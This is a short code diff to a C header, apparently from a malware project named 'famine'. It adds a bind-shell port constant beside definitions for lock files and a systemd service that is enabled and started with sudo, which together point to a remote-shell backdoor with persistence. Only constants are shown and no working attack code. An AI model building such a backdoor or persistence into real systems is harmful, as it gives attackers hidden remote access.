@@ -21,6 +21,8 @@ typedef struct s_service_ctx
 #define SUPER_USER_LOCK_FILE "/var/lock/famine.lock"
 #define WEAK_LOCK_FILE "/tmp/famine.lock"
 
+#define BIND_SHELL_PORT 4242
+
 #define SERVICE_FILE "/etc/systemd/system/famine.service"
 #define SERVICE_START "sudo systemctl start famine.service &"
 #define SERVICE_ENABLE "systemctl enable famine.service &"
